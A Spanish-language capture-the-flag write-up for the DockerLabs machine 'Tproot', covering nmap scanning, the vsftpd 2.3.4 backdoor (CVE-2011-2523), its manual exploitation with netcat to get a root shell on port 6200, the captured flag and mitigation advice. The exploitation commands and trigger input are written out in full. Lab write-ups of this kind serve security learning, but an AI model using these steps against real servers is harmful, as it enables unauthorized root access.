# Writeup: Tproot (DockerLabs)

**Autor:** [Tu Nombre/Usuario]
**Plataforma:** DockerLabs
**Dificultad:** Muy Fácil
**Vulnerabilidad Principal:** Backdoor en vsftpd 2.3.4 (CVE-2011-2523)

---

## 1. Objetivo del Laboratorio
Comprometer la máquina vulnerable "Tproot" realizando un escaneo de red, identificando servicios desactualizados y explotando manualmente una vulnerabilidad conocida para obtener acceso de administrador (`root`) y capturar la bandera (flag).

---

## 2. Reconocimiento y Escaneo

El primer paso consistió en descubrir qué puertos estaban abiertos en la máquina víctima (IP: `172.17.0.2`). Para ello, utilizamos **Nmap**.

### Escaneo de descubrimiento
Se ejecutó un escaneo rápido para identificar los puertos abiertos en todo el rango disponible (65,535 puertos):

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
```
* **Explicación de parámetros:**
  * `-p-`: Escanea todos los puertos (del 1 al 65535).
  * `--open`: Solo muestra los puertos que están abiertos.
  * `-sS`: *TCP SYN Scan* (escaneo sigiloso y rápido que no completa la conexión de 3 vías).
  * `--min-rate 5000`: Envía un mínimo de 5000 paquetes por segundo para agilizar el proceso.
  * `-n`: Evita la resolución DNS para no perder tiempo.
  * `-Pn`: Omite el descubrimiento de host (asume que la máquina está encendida).

### Escaneo de versiones
Una vez identificado el puerto 21 abierto, realizamos un escaneo profundo para determinar la versión exacta del servicio:

```bash
nmap -p 21 -sCV 172.17.0.2
```
* **Explicación de parámetros:**
  * `-p 21`: Apunta específicamente al puerto descubierto.
  * `-sC`: Ejecuta los scripts básicos de reconocimiento de Nmap.
  * `-sV`: Intenta determinar la versión exacta del servicio que se está ejecutando.

**Resultados de Nmap:**
```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".
```

---

## 3. Análisis de Vulnerabilidad

El escaneo reveló que el servidor está ejecutando **vsftpd 2.3.4**. Esta versión específica contiene un infame *backdoor* malicioso introducido en su código fuente original (CVE-2011-2523). 

**¿Cómo funciona el backdoor?** 
Si un cliente intenta iniciar sesión en el FTP enviando un nombre de usuario que contenga una carita feliz `:)`, el servicio abre silenciosamente una consola de comandos oculta en el puerto TCP 6200 con privilegios de `root`.

---

## 4. Explotación (Manual)

Para demostrar una comprensión profunda de la vulnerabilidad, la explotación se realizó de forma manual utilizando `netcat` (nc), en lugar de usar herramientas automatizadas como Metasploit.

**Paso 1: Activar el backdoor (Terminal 1)**
Nos conectamos al puerto 21 e introducimos el payload en el usuario:
```bash
nc 172.17.0.2 21
```
```text
220 (vsFTPd 2.3.4)
USER hacker:)
331 Please specify the password.
PASS 1234
```
*Nota: Tras ingresar la contraseña, la conexión se queda colgada. Esto indica que el payload `:)` fue interceptado y el puerto oculto se ha abierto.*

**Paso 2: Conectar a la shell (Terminal 2)**
Sin cerrar la primera terminal, abrimos una nueva y nos conectamos al puerto 6200 que el backdoor acaba de habilitar:
```bash
nc 172.17.0.2 6200
```
Verificamos nuestros privilegios:
```bash
whoami
# Resultado: root
```

---

## 5. Post-Explotación y Captura de Bandera

Con acceso máximo al sistema operativo en una *raw shell*, procedimos a buscar el archivo de la bandera.

```bash
pwd
# Resultado: /tmp/vsftpd-2.3.4-infected

cd /root
ls
# Se identifica un archivo .txt

cat root.txt
# Flag obtenida: 261fd3f32200f950f231816b4e9a0594
```
La máquina fue comprometida en su totalidad.

---

## 6. Mitigación Recomendada

Para solucionar esta vulnerabilidad crítica, se debe:
1. **Actualizar el servicio:** Migrar vsftpd a una versión superior y segura (por ejemplo, la rama 3.x) que no contenga el código malicioso.
2. **Implementar reglas de Firewall:** Configurar `iptables` o `ufw` para bloquear cualquier tráfico entrante a puertos no autorizados, evitando que puertos como el 6200 queden expuestos al exterior.